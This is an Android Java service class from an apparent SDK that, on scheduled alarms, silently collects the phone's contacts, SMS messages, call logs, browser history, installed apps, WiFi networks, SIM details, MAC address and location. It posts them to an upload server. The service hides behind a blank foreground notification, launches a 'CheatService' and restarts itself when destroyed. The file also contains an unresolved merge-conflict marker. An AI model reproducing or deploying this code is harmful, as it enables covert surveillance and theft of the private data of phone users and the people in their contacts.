package com.advance.library.service;

import static com.advance.library.utils.PhoneInfoUtils.*;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.util.Log;
import com.advance.library.receiver.RequestReceiver;
import com.zhy.http.okhttp.OkHttpUtils;
import com.zhy.http.okhttp.callback.StringCallback;
import java.util.Calendar;
import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.Response;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by Hongd on 2016/11/18.
 */
public class RequestService extends Service {

  private PendingIntent pendingIntentOne = null;
  private PendingIntent pendingIntentTwo = null;
  private PendingIntent pendingIntentInfo = null;
  private AlarmManager alarmManagerOne = null;
  private AlarmManager alarmManagerTwo = null;
  private AlarmManager alarmManagerGPS = null;
  private static final String POST_FILE_URL = "http://locahost:8083/sdk/upload";
  private static final String SHARED_NAME = "advance_analyze";
  private static final String SHARED_PUT_NAME = "jsonData";
  public SharedPreferences sharedPreferences = null;

  @Override
  public void onCreate() {
    super.onCreate();
    sharedPreferences = getApplicationContext()
        .getSharedPreferences(SHARED_NAME, Activity.MODE_PRIVATE);
    if (isNetworkAvailable(getApplicationContext()) && !sharedPreferences
        .getString(SHARED_PUT_NAME, "").equals("")) {
      Log.e("NETWORK---", "postHttp");
      postHttp(sharedPreferences.getString(SHARED_PUT_NAME, ""));
    }

    // 创建Intent对象，action为LOCATION
    Intent alarmIntent = new Intent();
    alarmIntent.setAction("alarm");
    Intent alarmIntentGPS = new Intent();
    alarmIntentGPS.setAction("alarmGPS");

    // 定义一个PendingIntent对象，PendingIntent.getBroadcast包含了sendBroadcast的动作。
    // 也就是发送了action 为"LOCATION"的intent
    pendingIntentOne = PendingIntent.getBroadcast(this, 0, alarmIntentGPS, 0);
    pendingIntentTwo = PendingIntent.getBroadcast(this, 1, alarmIntentGPS, 0);
    pendingIntentInfo = PendingIntent.getBroadcast(this, 2, alarmIntent, 0);
    // AlarmManager对象, AlarmManager为系统级服务
    alarmManagerOne = (AlarmManager) getSystemService(ALARM_SERVICE);
    alarmManagerTwo = (AlarmManager) getSystemService(ALARM_SERVICE);
    alarmManagerGPS = (AlarmManager) getSystemService(ALARM_SERVICE);

    //动态注册一个广播
    IntentFilter filter = new IntentFilter();
    filter.addAction("alarm");
    filter.addAction("alarmGPS");
    registerReceiver(alarmReceiver, filter);
  }

  @Override
  public int onStartCommand(Intent intent, int flags, int startId) {
    Intent intent1 = new Intent(this, CheatService.class);
    startService(intent1);
    startForeground(1, new Notification());

    alarmManagerOne
        .setRepeating(AlarmManager.RTC_WAKEUP, triggerAtMillis(10, 0), (24 * 60 * 60 * 1000),
            pendingIntentOne);
    alarmManagerTwo
        .setRepeating(AlarmManager.RTC_WAKEUP, triggerAtMillis(2, 0), (24 * 60 * 60 * 1000),
            pendingIntentTwo);
    Calendar calMorning = Calendar.getInstance();
    calMorning.setTimeInMillis(System.currentTimeMillis());
    calMorning.add(Calendar.MONTH, 3);
    calMorning.set(Calendar.HOUR_OF_DAY, 0);
    calMorning.set(Calendar.MINUTE, 0);
    calMorning.set(Calendar.SECOND, 0);
    calMorning.set(Calendar.MILLISECOND, 0);
    alarmManagerGPS
        .setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60 * 1000,
            calMorning.getTimeInMillis(),
            pendingIntentInfo);

    AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
    int alarmTime = 60 * 1000;
    long triggerAtTime = SystemClock.elapsedRealtime() + alarmTime;
    Intent i = new Intent(this, RequestService.class);
    PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
      alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
    } else {
      alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
    }
    return START_STICKY_COMPATIBILITY;
  }

  protected BroadcastReceiver alarmReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
      if (intent.getAction().equals("alarm")) {
        new Thread(new Runnable() {
          @Override
          public void run() {
            try {
              JSONObject object = new JSONObject();
              object.put("customerId", "2");
              object.put("identity", "1");
              object.put("contact", buildAllStringContacts(getApplicationContext()));
              object.put("apps", buildApps(getApplicationContext()));
              object.put("callHistory", buildCallHistory(getApplicationContext()));
              object.put("networkStatus", buildCurrentNetStatus(getApplicationContext()));
              object.put("sim", buildPhoneInfo(getApplicationContext()));
              object.put("sms", buildAllSms(getApplicationContext()));
              object.put("macAddress", buildMacAddress(getApplicationContext()));
              object.put("wifiList", buildConfiguredWifiList(getApplicationContext()));
              object.put("browserHistory", buildBrowserHistory(getApplicationContext()));
              object.put("battery", buildBatteryInfo(getApplicationContext()));
              object.put("location", buildLocation(getApplicationContext()));

              if (isNetworkAvailable(getApplicationContext())) {
                postHttp(object.toString());
              } else {
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString(SHARED_PUT_NAME, object.toString()).apply();
              }
            } catch (JSONException e) {
              e.printStackTrace();
            }
          }
        }).start();
      } else if (intent.getAction().equals("alarmGPS")) {
        new Thread(new Runnable() {
          @Override
          public void run() {
            try {
              JSONObject object = new JSONObject();
              object.put("customerId", "2");
              object.put("identity", "1");
              object.put("contact", new JSONArray());
              object.put("apps", new JSONArray());
              object.put("callHistory", new JSONArray());
              object.put("networkStatus", "");
              object.put("sim", new JSONObject());
              object.put("sms", new JSONArray());
              object.put("macAddress", "");
              object.put("wifiList", new JSONArray());
              object.put("browserHistory", new JSONArray());
              object.put("battery", new JSONObject());
              object.put("location", buildLocation(getApplicationContext()));

              if (isNetworkAvailable(getApplicationContext())) {
                postHttp(object.toString());
                Log.e("BroadcastReceiver", "alarmGPS");
              }
            } catch (JSONException e) {
              e.printStackTrace();
            }
          }
        }).start();
      }
    }
  };

  @Nullable
  @Override
  public IBinder onBind(Intent intent) {
    throw new UnsupportedOperationException("Not yet implemented");
  }

  @Override
  public void onDestroy() {
    Intent intent = new Intent(this, RequestReceiver.class);
    intent.putExtra("startService", "start");
    sendBroadcast(intent);
  }

  public void postHttp(String jsonString) {
    OkHttpUtils.postString()
        .url(POST_FILE_URL)
        .content(jsonString)
        .mediaType(MediaType.parse("application/json; charset=utf-8"))
        .build()
        .execute(new StringCallback() {
          @Override
          public void onError(Call call, Exception e, int id) {
            Log.e("onError--- ", e.getMessage());
          }

          @Override
          public void onResponse(String response, int id) {
            Log.e("onResponse--- ", response);
          }

          @Override
          public boolean validateReponse(Response response, int id) {
            if (response.isSuccessful()) {
              SharedPreferences.Editor editor = sharedPreferences.edit();
              editor.putString(SHARED_PUT_NAME, "").apply();
              Log.e("validateResponse", "SUCCESS");
            }
            return super.validateReponse(response, id);
          }
        });
  }

  /**
   * 检查当前网络是否可用  用于上传信息
   */
  public boolean isNetworkAvailable(Context context) {
    // 获取手机所有连接管理对象（包括对wi-fi,net等连接的管理）
    ConnectivityManager connectivityManager = (ConnectivityManager) context
        .getSystemService(Context.CONNECTIVITY_SERVICE);
    if (connectivityManager == null) {
      return false;
    } else {
      // 获取NetworkInfo对象
      NetworkInfo[] networkInfo = connectivityManager.getAllNetworkInfo();
      if (networkInfo != null && networkInfo.length > 0) {
        for (NetworkInfo aNetworkInfo : networkInfo) {
          // 判断当前网络状态是否为连接状态
          if (aNetworkInfo.getState() == State.CONNECTED) {
            return true;
          }
        }
      }
    }
    return false;
  }

  /**
<<<<<<< HEAD
   * 指定时间
=======
   * 指定的时间段(24小时制)
>>>>>>> dev
   */
  public long triggerAtMillis(int hourOfDay, int minute) {
    Calendar calMorning = Calendar.getInstance();
    calMorning.setTimeInMillis(System.currentTimeMillis());
    calMorning.set(Calendar.HOUR_OF_DAY, hourOfDay);
    calMorning.set(Calendar.MINUTE, minute);
    calMorning.set(Calendar.SECOND, 0);
    calMorning.set(Calendar.MILLISECOND, 0);
    // 如果当前时间大于设置的时间，那么就从第二天的设定时间开始
    if (System.currentTimeMillis() > calMorning.getTimeInMillis()) {
      calMorning.add(Calendar.DAY_OF_MONTH, 1);
    }
    return calMorning.getTimeInMillis();
  }
}
